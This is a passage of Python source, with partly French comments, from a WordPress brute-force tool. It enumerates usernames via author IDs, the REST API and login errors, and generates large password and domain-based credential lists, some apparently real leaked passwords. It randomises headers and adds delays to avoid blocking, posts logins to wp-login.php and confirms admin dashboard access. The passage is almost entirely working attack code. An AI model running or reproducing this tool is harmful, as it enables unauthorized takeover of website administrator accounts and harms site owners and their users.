            'warrior', 'cocacola', 'bubble', 'albert', 'einstein', 'chicago', 'franklin',
            'dolphin', 'testtest', 'diamond', 'bronco', 'pokemon', 'guitar', 'jackson',
            'mickey', 'scooby', 'nascar', 'tigger', 'yellow', 'babygirl', 'sparky',
            'shadow1', 'raiders', 'sandiego', 'rosebud', 'morgan', 'bigdaddy', 'cowboy',
            'richard', 'blue', 'orange1', 'justme', 'fender', 'johnson', 'jackie',
            'monster', 'toyota', 'spider', 'robert', 'sophie', 'apples', 'victoria',
            'viking', 'playboy', 'green', 'samsung1', 'panther', 'silver', 'parker',
            'scorpio', 'arthur', 'badboy', 'vikings', 'tucker', 'charles', 'boston',
            'butter', 'member', 'carlos', 'tennis', 'hammer', 'oliver', 'marina',
            'denise', 'squirt', 'raymond', 'redsox', 'bigdog', 'golfer1', 'jackson1',
            'alex', 'tigers', 'jasper', 'rocket', 'bulldog', 'scroll', 'france', 'running'
        ]
        
        passwords.extend(emergency_passwords)

        passwords.extend([
            'asdf', 'asdf1234', 'qwer', 'qwer1234', 'zxcv', 'zxcv1234',
            'pass', 'pass123', 'pwd', 'pwd123', 'temp', 'temp123',
            'change', 'changeit', 'update', 'new', 'newpass',
            'fuck', 'shit', 'damn', 'hell', 'wtf'
        ])
        passwords.extend([
            'facebook', 'twitter', 'instagram', 'youtube', 'google',
            'gmail', 'yahoo', 'hotmail', 'outlook', 'whatsapp',
            'tiktok', 'snapchat', 'linkedin', 'pinterest', 'reddit'
        ])
        passwords.extend([
            'root123', 'admin@123', 'su123', 'sudo', 'linux',
            'windows', 'ubuntu', 'debian', 'centos', 'apache',
            'mysql', 'php', 'html', 'css', 'javascript',
            'python', 'java', 'code', 'hack', 'security'
        ])
        passwords = list(OrderedDict.fromkeys(passwords))
        priority_passwords = []
        if name:
            priority_passwords.extend([p for p in passwords if name in p][:20])
        priority_passwords.extend([
            'admin', 'admin123', '123456', 'password', 'demo',
            'test', 'joomla', 'joomla123', '12345678', 'admin1234'
        ])
        priority_passwords.extend([p for p in passwords if str(current_year) in p or str(current_year-1) in p][:10])
        for p in passwords:
            if p not in priority_passwords:
                priority_passwords.append(p)

        return priority_passwords[:60]  

    def generate_smart_usernames(self, domain_info):
        """Generate usernames with PROVEN high success rate"""
        usernames = set()
        
        # Usernames de base
        base_usernames = [
            'admin', 'administrator', 'root', 'user', 'test', 'demo', 'manager',
            'webmaster', 'sysadmin', 'operator', 'superuser', 'superadmin'
        ]
        usernames.update(base_usernames)
        
        # Méthode 6: Basé sur le domaine (AJOUTÉE)
        if domain_info and domain_info['name']:
            name = domain_info['name']
            domain_based_usernames = [
                name, name.lower(), name.capitalize(),
                f"admin{name}", f"{name}admin", f"wp{name}",
                f"{name}user", f"user{name}", f"test{name}",
                f"demo{name}", f"Demo{name}", f"{name}demo",
                f"{name}Demo", f"{name}DEMON", f"{name}demons",
                f"{name}demon", f"{name}TEST", f"1234{name}", f"12345678{name}",
                f"{name}1234"
            ]
            usernames.update(domain_based_usernames)
        
        # Nettoyer et filtrer les usernames (AJOUTÉ)
        cleaned_usernames = []
        for username in usernames:
            if username and len(username) >= 2 and len(username) <= 30:
                if not re.match(r'^\d+$', username):
                    cleaned_usernames.append(username)
        
        return cleaned_usernames[:15]

    def generate_advanced_passwords_for_user(self, username, domain_info):
        """Générer des mots de passe spécifiques pour un username donné"""
        passwords = set()
        
        # Mots de passe basés sur le username
        username_passwords = [
            username,
            username + '123',
            username + '1234', 
            username + '12345',
            username + '123456',
            username + '!',
            username + '@123',
            username + '#123',
            username + '2024',
            username + '2023',
            username + 'admin',
            'admin' + username,
            username + 'pass',
            'pass' + username,
        ]
        
        passwords.update(username_passwords)
        
        # Ajouter les mots de passe généraux intelligents
        smart_passwords = self.generate_smart_passwords(domain_info)
        passwords.update(smart_passwords)
        
        return list(passwords)[:100]

    def generate_domain_based_credentials(self, domain, found_usernames):
        """Générer des credentials basés sur le domaine avec la nouvelle technique @domain"""
        credentials = []
        
        if not domain:
            return credentials
        
        # Extraire le nom de domaine de base (sans TLD)
        domain_base = domain.split('.')[0]
        
        # Usernames par défaut si aucun trouvé
        default_usernames = ['admin', 'administrator', 'root', 'user', 'test', 'demo', 'webmaster', 'manager']
        
        # Combiner les usernames trouvés avec les usernames par défaut
        all_usernames = set()
        
        # Ajouter les usernames trouvés
        if found_usernames:
            all_usernames.update(found_usernames)
            print(f' -| Using {len(found_usernames)} found usernames: {", ".join(found_usernames[:5])}' + 
                  (f' and {len(found_usernames)-5} more' if len(found_usernames) > 5 else ''))
        
        # Ajouter les usernames par défaut
        all_usernames.update(default_usernames)
        
        # Convertir en liste pour l'itération
        usernames_list = list(all_usernames)
        
        print(f' -| Total usernames to Extract: {len(usernames_list)}')
        
        # NOUVELLE TECHNIQUE: Ajouter @domain aux usernames comme mots de passe
        for username in usernames_list:
            # Technique 1: username@domain comme mot de passe
            credentials.append((username, f"{username}@{domain}"))
            credentials.append((username, f"{username}@{domain_base}"))
            
            # Technique 2: domain@domain comme mot de passe
            credentials.append((username, f"{domain}@{domain}"))
            credentials.append((username, f"{domain_base}@{domain_base}"))
            credentials.append((username, f"{domain}@{domain_base}"))
            credentials.append((username, f"{domain_base}@{domain}"))
            
            # Technique 3: Variations avec le domaine
            credentials.append((username, f"{username}@.{domain}"))
            credentials.append((username, f"{username}@{domain}."))
            credentials.append((username, f"{username}@{domain_base}."))
            credentials.append((username, f"{username}@.{domain_base}"))
            
            # Technique 4: Avec des chiffres
            credentials.append((username, f"{username}@{domain}123"))
            credentials.append((username, f"{username}@{domain_base}123"))
            credentials.append((username, f"{domain}@{domain}123"))
            credentials.append((username, f"{domain_base}@{domain_base}123"))
            
            # Technique 5: Avec des caractères spéciaux
            credentials.append((username, f"{username}@{domain}!"))
            credentials.append((username, f"{username}@{domain}#"))
            credentials.append((username, f"{domain}@{domain}!"))
            credentials.append((username, f"{domain_base}@{domain_base}#"))
            
            # Technique 6: Variations simples du username comme mot de passe
            credentials.append((username, username))  # username comme mot de passe
            credentials.append((username, f"{username}123"))
            credentials.append((username, f"{username}1234"))
            credentials.append((username, f"{username}123456"))
            credentials.append((username, f"{username}!"))
            credentials.append((username, f"{username}@123"))
            
            # Technique 7: Mots de passe communs avec le username
            common_passwords = ['password', 'pass', '123456', 'admin', 'welcome', 'test']
            for common_pwd in common_passwords:
                credentials.append((username, common_pwd))
                credentials.append((username, f"{username}{common_pwd}"))
                credentials.append((username, f"{common_pwd}{username}"))
        
        # Ajouter aussi les combinaisons username/password classiques
        for username in usernames_list:
            for password in usernames_list:  # Tester chaque username comme mot de passe pour chaque username
                if username != password:  # Éviter les doublons
                    credentials.append((username, password))
        
        # Supprimer les doublons
        unique_credentials = []
        seen = set()
        for cred in credentials:
            if cred not in seen:
                seen.add(cred)
                unique_credentials.append(cred)
        
        print(f' -| Generated {len(unique_credentials)} unique credentials with domain-based technique')
        
        return unique_credentials

    def calculate_smart_delay(self, attempt_number):
        """Calculer un délai intelligent pour éviter le blocage"""
        base_delay = 0.5
        if attempt_number > 20:
            base_delay = 1.0
        elif attempt_number > 50:
            base_delay = 2.0
        
        random_variation = random.uniform(0.1, 0.5)
        return base_delay + random_variation
            
    def make_folders(self):
        """Create necessary output folders"""
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
            
        # Create Files directory if not exists
        if not os.path.exists('Files'):
            os.makedirs('Files')

    def get_random_headers(self):
        """Get ultra-most randomized headers"""
        chrome_versions = ['112.0.0.0', '113.0.0.0', '114.0.0.0', '115.0.0.0']
        firefox_versions = ['120.0', '120.0', '119.0', '118.0']
        safari_versions = ['17.2', '17.1', '17.0', '16.6']

        os_strings = [
            'Windows NT 10.0; Win64; x64',
            'Windows NT 11.0; Win64; x64',
            'Macintosh; Intel Mac OS X 10_15_7',
            'Macintosh; Intel Mac OS X 11_1_2',
            'X11; Linux x86_64',
            'X11; Ubuntu; Linux x86_64'
        ]
        
        browser_choice = random.randint(1, 10)

        if browser_choice <= 5:
            version = random.choice(chrome_versions)
            os_string = random.choice(os_strings)
            user_agent = f'Mozilla/5.0 ({os_string}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Safari/537.36'

        elif browser_choice <= 8:
            version = random.choice(firefox_versions)
            os_string = random.choice(os_strings[:4])
            user_agent = f'Mozilla/5.0 ({os_string}; rv:{version}) Gecko/20100101 Firefox/{version}'

        else:
            version = random.choice(safari_versions)
            os_string = random.choice(os_strings[2:4])
            user_agent = f'Mozilla/5.0 ({os_string}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version} Safari/605.1.15'

        languages = [
            'en-US,en;q=0.9',
            'en-US,en;q=0.9,ar;q=0.8',
            'en-GB,en;q=0.9',
            'en-US,en;q=0.8,es;q=0.6',
            'en-US,en;q=0.9,fr;q=0.8',
            'en-US,en;q=0.9,de;q=0.8'
        ]

        referers = [
            'https://www.google.com/',
            'https://www.google.com/search?q=wordpress',
            'https://www.bing.com/',
            'https://duckduckgo.com/',
            'https://wordpress.org/',
            'https://www.facebook.com/',
            'https://t.co/'
        ]

        headers = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': random.choice(languages),
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': random.choice(['1', None]),
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
            'Sec-Fetch-User': '?1',
            'Cache-Control': random.choice(['max-age=0', 'no-cache', None]),
            'Pragma': random.choice(['no-cache', None]),
        }

        if random.randint(1, 10) <= 7:
            headers['Referer'] = random.choice(referers)

        if 'Chrome' in user_agent:
            headers['Sec-Ch-Ua'] = f'"Not_A Brand";v="99", "Chromium";v="{version.split(".")[0]}", "Google Chrome";v="{version.split(".")[0]}"'
            headers['Sec-Ch-Ua-Mobile'] = '?0'

        return headers

    def get_login_headers(self, login_url):
        """Get headers specifically for login requests"""
        headers = self.get_random_headers()
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        headers['Origin'] = login_url
        headers['Referer'] = login_url
        return headers

    def normalize_url(self, url):
        """Advanced URL Normalization"""
        if not url:
            return ""
            
        url = str(url).strip().rstrip('/')
        
        # Ensure proper protocol
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
            
        # Clean up double slashes and other anomalies
        url = url.replace('https:/', 'https://').replace('http:/', 'http://')
        url = re.sub(r'([^:]/)/+', r'\1', url)  # Remove duplicate slashes
        
        # Remove common paths that might be added incorrectly
        for path in ['/wp-login.php', '/wp-admin', '/admin', '/login']:
            if url.endswith(path):
                url = url[:-len(path)]
                
        return url.rstrip('/')

    def extract_domain(self, url):
        """Extract clean domain"""
        try:
            parsed = urlparse(url)
            domain = parsed.netloc or parsed.path
            domain = domain.replace('www.', '').split(':')[0]
            return domain
        except:
            return None

    def random_string(self, length):
        """Generate random string"""
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for i in range(length))

    def content_from_response(self, response):
        """Extract content from response"""
        try:
            return response.content.decode('utf-8', errors='ignore')
        except:
            try:
                return response.text
            except:
                return str(response.content)

    def extract_usernames(self, url, session):
        """Extract WordPress usernames using multiple methods"""
        found_usernames = []
        
        # Method 1: Author ID Enumeration
        try:
            for author_id in range(1, 6):
                author_url = url + '/?author=' + str(author_id)
                resp = session.get(author_url, headers=self.get_random_headers(),
                                timeout=5, verify=False, allow_redirects=True)

                if resp.status_code == 200:
                    final_url = resp.url

                    patterns = [
                        r'/author/([^/]+)/',
                        r'/author/([^/]+)$',
                        r'/\?author_name=([^&]+)',
                        r'/archives/author/([^/]+)'
                    ]

                    for pattern in patterns:
                        match = re.search(pattern, final_url)
                        if match:
                            username = match.group(1)
                            if username and username not in found_usernames:
                                found_usernames.append(username)
                                print('-| ' + url + ' --> ' + self.fb + ' [Found Username: ' + username + ']')
                                break
        except:
            pass

        # Method 2: REST API Users Endpoint
        try:
            api_url = url + '/wp-json/wp/v2/users'
            resp = session.get(api_url, headers=self.get_random_headers(),
                            timeout=5, verify=False)
            
            if resp.status_code == 200:
                try:
                    users = resp.json()
                    for user in users[:5]:
                        if 'slug' in user:
                            username = user['slug']
                            if username and username not in found_usernames:
                                found_usernames.append(username)
                                print('-| ' + url + ' --> ' + self.fb + '[API Username: ' + username + ']')
                except:
                    pass
        except:
            pass
            
        # Method 3: Login page error messages
        try:
            login_url, _ = resolve_wordpress_login_url(url, session, self.get_random_headers())
            if not login_url:
                login_url = url + '/wp-login.php'
            resp = session.get(login_url, headers=self.get_random_headers(),
                            timeout=5, verify=False)
            
            if resp.status_code == 200:
                content = resp.text
                # Look for username mentions in error messages or forms
                username_patterns = [
                    r'The username <strong>([^<]+)</strong> is not registered',
                    r'Invalid username\. <a href="[^"]*">Lost your password</a>\?',
                    r'name="log" value="([^"]*)"',
                ]
                
                for pattern in username_patterns:
                    matches = re.findall(pattern, content)
                    for match in matches:
                        if match and match not in found_usernames:
                            found_usernames.append(match)
                            print('-| ' + url + ' --> ' + self.fb + '[Form Username: ' + match + ']')
        except:
            pass
            
        return found_usernames

    def flexible_wordpress_detection(self, url):
        """Very flexible WordPress detection"""
        session = create_session()
        login_url = None
        
        try:
            login_url, _ = resolve_wordpress_login_url(url, session, self.get_random_headers())
            if login_url:
                return True, login_url, session

            if url.startswith('https://'):
                url_http = url.replace('https://', 'http://')
                login_url, _ = resolve_wordpress_login_url(url_http, session, self.get_random_headers())
                if login_url:
                    return True, login_url, session
        except:
            pass
            
        alt_paths = ['/wp-admin/', '/login', '/admin', '/wp-admin']
        for path in alt_paths:
            try:
                test_url = url + path
                resp = session.get(test_url, headers=self.get_random_headers(),
                                timeout=5, verify=False, allow_redirects=True)
                if resp.status_code == 200 and 'wp-' in resp.text.lower():
                    login_url, _ = resolve_wordpress_login_url(url, session, self.get_random_headers())
                    if not login_url:
                        login_url = url + '/wp-login.php'
                    return True, login_url, session
            except:
                continue

        return False, None, session

    def generate_bruteforce_passwords(self, domain, found_usernames=None):
        """Generate comprehensive password list for brute force"""
        passwords = set()
        
        # Common passwords list
        common_passwords = [
            'admin', 'admin123','root', '7807914125', 'wp_9666972@jesusbless1979', 'jesusbless1979','password', '123456', '12345@67890', 
            '1234567890', 'Demo', 'demo', 'manager', '12345678', '1234', '12345', '@0192837465z', '0192837465z',
            'qwerty', '12345@6789', '12345@678', '12345@6780', '67890',  '12345@67890',
            '12345@98760','12345@abcde','12345@ABCDE','12345@!@#$%','Alfred01!', 'abcd1234', 'Working1', 'passw0rdbks!','Horst666',
            '12345@67890Ab','12345@password','12345@secure','12345@qwerty', '123quevedo', 'Martonvasar.1', 'Ideia3043',
            '12345@admin123' , 'letmein', 'welcome', 'monkey', 'sunshine',
            'password1', '123456789', 'football', 'iloveyou', 'starwars', 'dragon', 'Logitech1985&','Acushla30!','newpass123!!!',
            'passw0rd', 'master', 'hello', 'freedom', 'whatever', 'qazwsx', 'trustno1', '@Cris112#', '68Gauri!!',
            '654321', 'jordan23', 'harley', 'password123', '1q2w3e4r', '555555', 'batatour2020',
            'loveme', 'hello123', 'zaq1zaq1', 'abc123', '123123', 'donald', 'batman',
            'access', 'shadow', 'superman', 'qwerty123', 'michael', 'mustang', 'jennifer',
            '111111', '2000', 'jordan', 'super123', '123456a', 'andrew', 'matthew',
            'golfer', 'buster', 'nicole', 'jessica', 'pepper', '1111', 'zxcvbn', '555555',
            '11111111', '131313', 'freedom1', '7777777', 'pass', 'maggie', '159753',
            'aaaaaa', 'ginger', 'princess', 'joshua', 'cheese', 'amanda', 'summer',
            'love', 'ashley', '6969', 'nicole1', 'chelsea', 'biteme', 'matthew1',
            'access14', 'yankees', '987654321', 'dallas', 'austin', 'thunder', 'taylor',
            'matrix', 'minecraft', 'buster1', 'hello1', 'charlie', '1234567', '1234567890',
            '888888', '123123123', 'flower', 'password2', 'soccer', 'purple', 'george',
            'chicken', 'samsung', 'anthony', 'andrea', 'killer', 'jessica1', 'peanut',
            'jordan1', 'justin', 'liverpool', 'daniel', 'secret', 'asdfghjkl', '123654',
            'orange', 'computer', 'michelle', 'mercedes', 'banana', 'blink182', 'qwertyuiop',
            '123321', 'snoopy', 'baseball', 'whatever1', 'creative', 'patrick', 'internet',
            'scooter', 'muffin', '123abc', 'madison', 'hockey', 'arsenal', 'dragon1',
            'maverick', 'cookie', 'ashley1', 'bandit', 'knight', 'ginger1', 'shannon',
            'william', 'startrek', 'phantom', 'camaro', 'boomer', 'coffee', 'falcon',
            'winner', 'smith', 'sierra', 'runner', 'butterfly', 'test123', 'merlin',
            'warrior', 'cocacola', 'bubble', 'albert', 'einstein', 'chicago', 'franklin',
            'dolphin', 'testtest', 'diamond', 'bronco', 'pokemon', 'guitar', 'jackson',
            'mickey', 'scooby', 'nascar', 'tigger', 'yellow', 'babygirl', 'sparky',
            'shadow1', 'raiders', 'sandiego', 'rosebud', 'morgan', 'bigdaddy', 'cowboy',
            'richard', 'blue', 'orange1', 'justme', 'fender', 'johnson', 'jackie',
            'monster', 'toyota', 'spider', 'robert', 'sophie', 'apples', 'victoria',
            'viking', 'playboy', 'green', 'samsung1', 'panther', 'silver', 'parker',
            'scorpio', 'arthur', 'badboy', 'vikings', 'tucker', 'charles', 'boston',
            'butter', 'member', 'carlos', 'tennis', 'hammer', 'oliver', 'marina',
            'denise', 'squirt', 'raymond', 'redsox', 'bigdog', 'golfer1', 'jackson1',
            'alex', 'tigers', 'jasper', 'rocket', 'bulldog', 'scroll', 'france', 'running'
        ]
        
        for pwd in common_passwords:
            passwords.add(pwd)
        
        # Add domain-based passwords
        if domain:
            domain_parts = domain.split('.')
            domain_base = domain_parts[0]
            
            # Add domain name variations
            passwords.add(domain_base)
            passwords.add(domain_base + '123')
            passwords.add(domain_base + '1234')
            passwords.add(domain_base + '12345')
            passwords.add(domain_base + '123456')
            passwords.add(domain_base + '2023')
            passwords.add(domain_base + '2024')
            passwords.add(domain_base + '2020')
            passwords.add(domain_base + '!')
            passwords.add(domain_base + '@')
            passwords.add(domain_base + '#')
            
            # Ajout des nombres de 0 à 1000
            for i in range(1001):
                passwords.add(domain_base + str(i))
                # Ajout avec préfixe 0 (00, 000, etc.) jusqu'à 4 chiffres
                passwords.add(domain_base + str(i).zfill(2))  # 00 à 99
                passwords.add(domain_base + str(i).zfill(3))  # 000 à 999
                passwords.add(domain_base + str(i).zfill(4))  # 0000 à 1000
        
        # Add number variations (01 to 1000)
        for i in range(1, 1001):
            num_str = str(i).zfill(2)  # Pad with zeros
            passwords.add(num_str)
            
        # Add year variations (1801 to 2050)
        for year in range(1801, 2051):
            passwords.add(str(year))
        
        # Add special character variations
        special_chars = ['!', '@', '#', '$', '%', '^', '&', '*', '()', '{}', '[]']
        base_passwords = list(passwords)  # Create a copy to avoid modifying during iteration
        
        for pwd in base_passwords:
            for char in special_chars:
                # Add special character at the end
                passwords.add(pwd + char)
                # Add special character at the beginning
                passwords.add(char + pwd)
                # Add special character at both ends
                passwords.add(char + pwd + char)
        
        return list(passwords)

    def generate_smart_credentials(self, domain, found_usernames=None):
        """Generate comprehensive credentials for brute force"""
        credentials = []
        
        # Default usernames if none found
        default_usernames = ['admin', 'administrator', 'root', 'wp_9666972', 'wadminw', 'user', 'test', 'demo', 'manager']
        
        # Add found usernames
        if found_usernames:
            usernames = found_usernames + default_usernames
        else:
            usernames = default_usernames
            
        # Remove duplicates
        usernames = list(set(usernames))
        
        # Generate passwords
        passwords = self.generate_bruteforce_passwords(domain, found_usernames)
        
        # NOUVELLE TECHNIQUE: Ajouter les credentials basés sur le domaine avec @domain
        domain_credentials = self.generate_domain_based_credentials(domain, found_usernames)
        credentials.extend(domain_credentials)
        
        # Create credential pairs traditionnels
        for username in usernames:
            for password in passwords[:100]:  # Limit to first 100 passwords per username
                credentials.append((username, password))
                
        return credentials

    def verify_real_admin_access(self, session, url, headers):
        """Strictly verify REAL admin panel access"""
        try:
            critical_pages = [
                '/wp-admin/index.php',
                '/wp-admin/profile.php'
            ]

            verified_pages = 0
            admin_content = ""

            for page in critical_pages:
                try:
                    test_url = url + page
                    resp = session.get(test_url, headers=headers,
                                    timeout=10, verify=False, allow_redirects=True)

                    if resp.status_code == 200:
                        if 'wp-login.php' in resp.url:
                            return False, None

                        content = resp.text

                        admin_indicators = [
                            '<div id="wpwrap">',
                            '<div id="wpcontent">',
                            '<div id="wpbody">',
                            'id="adminmenu"',
                            'id="adminmenuwrap"',
                            'class="wp-admin"',
                            'id="wpadminbar"'
                        ]

                        found = sum(1 for ind in admin_indicators if ind in content)
                        if found >= 3:
                            verified_pages += 1
                            if not admin_content:
                                admin_content = content

                        if verified_pages >= 2:
                            return True, admin_content
                except:
                    continue

            return verified_pages >= 1, admin_content

        except:
            return False, None
    
    def simple_login_check(self, session, url, username, password, login_url):
        """Simple and flexible login check with ENHANCED admin verification"""
        try:
            # Rate limiting
            current_time = time.time()
            if current_time - self.last_request_time < self.min_request_interval:
                time.sleep(self.min_request_interval - (current_time - self.last_request_time))
                self.last_request_time = time.time()
            
            headers = self.get_login_headers(login_url)
            login_data = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': url + '/wp-admin/',
                'testcookie': '1'
            }
            
            login_resp = session.post(login_url, data=login_data, headers=headers,
                            timeout=self.timeout, verify=False, allow_redirects=False)
            
            # VÉRIFICATIONS MULTIPLES AMÉLIORÉES POUR CONFIRMER L'ACCÈS ADMIN
            
            # Méthode 1: Vérification des cookies d'authentification WordPress
            has_auth_cookie = any('wordpress_logged_in' in cookie.name for cookie in session.cookies)
            has_secure_cookie = any('wordpress_sec' in cookie.name for cookie in session.cookies)
            has_admin_cookie = any('wp-settings' in cookie.name for cookie in session.cookies)
            auth_cookies_found = sum([has_auth_cookie, has_secure_cookie, has_admin_cookie])
            
            # Méthode 2: Vérification de la redirection vers l'admin (AMÉLIORÉE)
            redirect_to_admin = False
            if login_resp.status_code in [301, 302, 303, 307]:
                location = login_resp.headers.get('Location', '')
                if 'wp-admin' in location and 'wp-login' not in location:
                    redirect_to_admin = True
                    print(' -| ' + url + ' --> ' + Fore.GREEN + '[Admin redirect detected]')
            
            # Méthode 3: Vérification du contenu de la réponse de connexion (AMÉLIORÉE)
            content_lower = login_resp.text.lower()
            
            # INDICATEURS DE SUCCÈS ÉTENDUS
            login_success_indicators = [
                'dashboard', 'wp-admin', 'admin area', 'wordpress dashboard',
                'howdy', 'welcome to wordpress', 'wp-menu', 'admin-menu',
                'site-title', 'wp-toolbar', 'admin-bar', 'wp-admin-bar',
                'admin.php', 'profile.php', 'edit.php', 'upload.php',
                'appearance', 'plugins', 'users', 'tools', 'settings',
                'screen-options', 'contextual-help', 'post-new.php'
            ]
            
            login_indicators_found = sum(1 for indicator in login_success_indicators if indicator in content_lower)
            
            # VÉRIFICATION APPROFONDIE DU DASHBOARD WORDPRESS (AMÉLIORÉE)
            dashboard_verified = False
            admin_access_confirmed = False
            wp_admin_active = False
            
            # NOUVELLE VÉRIFICATION: Test direct de l'accès wp-admin
            try:
                admin_test = session.get(url + '/wp-admin/', headers=headers, 
                                timeout=10, verify=False, allow_redirects=True)
                
                if admin_test.status_code == 200:
                    admin_content = admin_test.text
                # Vérifier si wp-admin est actif et accessible
                if 'wp-admin' in admin_test.url and 'wp-login' not in admin_test.url:
                    wp_admin_active = True
                    print(' -| ' + url + ' --> ' + Fore.GREEN + '[wp-admin access confirmed]')
            except Exception as e:
                print(' -| ' + url + ' --> ' + Fore.RED + f'[wp-admin test failed: {str(e)[:50]}]')
            
            # Si wp-admin est actif, considérer comme valide même avec peu d'indicateurs
            if wp_admin_active:
                # Vérification renforcée mais flexible du dashboard
                try:
                    dashboard_response = session.get(url + '/wp-admin/', 
                                                    headers=headers, timeout=10, 
                                                    verify=False, allow_redirects=True)
                    
                    if dashboard_response.status_code == 200:
                        dashboard_content = dashboard_response.text
                        dashboard_lower = dashboard_content.lower()
                        
                        # INDICATEURS RENFORCÉS MAIS FLEXIBLES
                        strong_dashboard_indicators = [
                            'id="wpadminbar"', 'id="adminmenuwrap"', 'id="wpcontent"',
                            'class="wp-admin"', 'admin_color', 'adminmenu'
                        ]
                        
                        medium_dashboard_indicators = [
                            'dashboard', 'wp-admin', 'howdy', 'welcome',
                            'site-title', 'menu-top', 'wp-menu'
                        ]
                        
                        content_indicators = [
                            'at a glance', 'activity', 'quick draft', 'wordpress events',
                            'recent comments', 'recent drafts'
                        ]
                        
                        # Compter les indicateurs trouvés
                        strong_indicators_found = sum(1 for indicator in strong_dashboard_indicators if indicator in dashboard_content)
                        medium_indicators_found = sum(1 for indicator in medium_dashboard_indicators if indicator in dashboard_lower)
                        content_indicators_found = sum(1 for indicator in content_indicators if indicator in dashboard_lower)
                        
                        # Vérifier la présence d'éléments critiques
                        has_admin_bar = 'id="wpadminbar"' in dashboard_content
                        has_admin_menu = any(indicator in dashboard_content for indicator in ['id="adminmenuwrap"', 'class="wp-admin"'])
                        has_wp_content = 'id="wpcontent"' in dashboard_content
                        
                        # CONDITIONS DE VALIDATION FLEXIBLES
                        # Si wp-admin est actif, on accepte avec moins d'indicateurs
                        dashboard_criteria_met = (
                            (strong_indicators_found >= 2) or
                            (has_admin_bar and has_admin_menu) or
                            (medium_indicators_found >= 3) or
                            (strong_indicators_found >= 1 and medium_indicators_found >= 2) or
                            (wp_admin_active and medium_indicators_found >= 1)  # Plus flexible si wp-admin actif
                        )
                        
                        # TEST DES PAGES ADMIN (AMÉLIORÉ)
                        if dashboard_criteria_met:
                            admin_pages_to_test = [
                                '/wp-admin/profile.php',
                                '/wp-admin/options-general.php',
                                '/wp-admin/index.php',
                                '/wp-admin/edit.php',
                                '/wp-admin/themes.php'
                            ]
                            
                            accessible_pages = 0
                            for admin_page in admin_pages_to_test:
                                try:
                                    page_response = session.get(url + admin_page, 
                                                              headers=headers, timeout=5, 
                                                              verify=False, allow_redirects=True)
                                    if page_response.status_code == 200 and 'wp-login' not in page_response.url:
                                        accessible_pages += 1
                                        if accessible_pages >= 2:  # Arrêter dès qu'on a 2 pages accessibles
                                            break
                                except:
                                    continue
                            
                            # Plus flexible: 1 page admin accessible suffit si wp-admin est actif
                            admin_access_confirmed = accessible_pages >= (1 if wp_admin_active else 2)
                        
                        dashboard_verified = dashboard_criteria_met and admin_access_confirmed
                        
                        # Log détaillé pour le débogage
                        if dashboard_verified:
                            print(' -| ' + url + ' --> ' + Fore.GREEN + 
                                  f'[DASHBOARD VERIFIED: {strong_indicators_found} strong, {medium_indicators_found} medium indicators, {accessible_pages} admin pages]')
                        else:
                            print(' -| ' + url + ' --> ' + Fore.YELLOW + 
                                  f'[Dashboard weak: {strong_indicators_found} strong, {medium_indicators_found} medium indicators, {accessible_pages} admin pages]')
                                
                except Exception as e:
                    print(' -| ' + url + ' --> ' + Fore.RED + f'[Dashboard check failed: {str(e)[:50]}]')
            
            # DÉCISION FINALE BASÉE SUR TOUS LES TESTS (AMÉLIORÉE)
            login_successful = False
            
            # NIVEAU 1: Accès admin complet vérifié
            if dashboard_verified and admin_access_confirmed:
                login_successful = True
                print(' -| ' + url + ' --> ' + Fore.GREEN + '[ADMIN ACCESS FULLY VERIFIED]')
            
            # NIVEAU 2: wp-admin actif avec indicateurs moyens
            elif wp_admin_active and (auth_cookies_found >= 1 or login_indicators_found >= 2):
                login_successful = True
                print(' -| ' + url + ' --> ' + Fore.GREEN + '[ADMIN ACCESS via active wp-admin]')
            
            # NIVEAU 3: Redirection admin avec cookies
            elif redirect_to_admin and auth_cookies_found >= 1:
                login_successful = True
                print(' -| ' + url + ' --> ' + Fore.GREEN + '[ADMIN ACCESS via redirect and cookies]')
            
            # NIVEAU 4: Fortes indications d'accès admin
            elif (auth_cookies_found >= 2 and login_indicators_found >= 2):
                login_successful = True
                print(' -| ' + url + ' --> ' + Fore.GREEN + '[STRONG ADMIN INDICATIONS]')
            
            # NIVEAU 5: wp-admin actif seul (dernier recours)
            elif wp_admin_active:
                login_successful = True
                print(' -| ' + url + ' --> ' + Fore.GREEN + '[BASIC ADMIN ACCESS - wp-admin active]')
            
            # VÉRIFICATIONS SUPPLÉMENTAIRES POUR LES CAS LIMITES
            if not login_successful:
                # Test de la page de profil
                try:
                    profile_check = session.get(url + '/wp-admin/profile.php', 
                                              headers=headers, timeout=5, 
                                              verify=False, allow_redirects=True)
                    if profile_check.status_code == 200 and 'wp-login' not in profile_check.url:
                        login_successful = True
                        print(' -| ' + url + ' --> ' + Fore.GREEN + '[ADMIN CONFIRMED via profile access]')
                except:
                    pass
            
            if not login_successful:
                # Test de la page des réglages
                try:
                    options_check = session.get(url + '/wp-admin/options-general.php', 
                                              headers=headers, timeout=5, 
                                              verify=False, allow_redirects=True)
                    if options_check.status_code == 200 and 'wp-login' not in options_check.url:
                        login_successful = True
                        print(' -| ' + url + ' --> ' + Fore.GREEN + '[ADMIN CONFIRMED via settings access]')
                except:
                    pass
            
            if login_successful:
                # Vérification finale avec une requête rapide au dashboard
                try:
                    final_check = session.get(url + '/wp-admin/index.php', 
                                            headers=headers, timeout=5, 
                                            verify=False, allow_redirects=True)
                    if final_check.status_code != 200 or 'wp-login' in final_check.url:
                        print(' -| ' + url + ' --> ' + Fore.YELLOW + '[Final check failed, but keeping access]')
                except:
                    pass
                
                return True, username, password
            else:
                # Log détaillé des raisons de l'échec (AMÉLIORÉ)
                failure_reasons = []
                if auth_cookies_found == 0:
                    failure_reasons.append("no auth cookies")
                if not redirect_to_admin:
                    failure_reasons.append("no admin redirect")
                if not wp_admin_active:
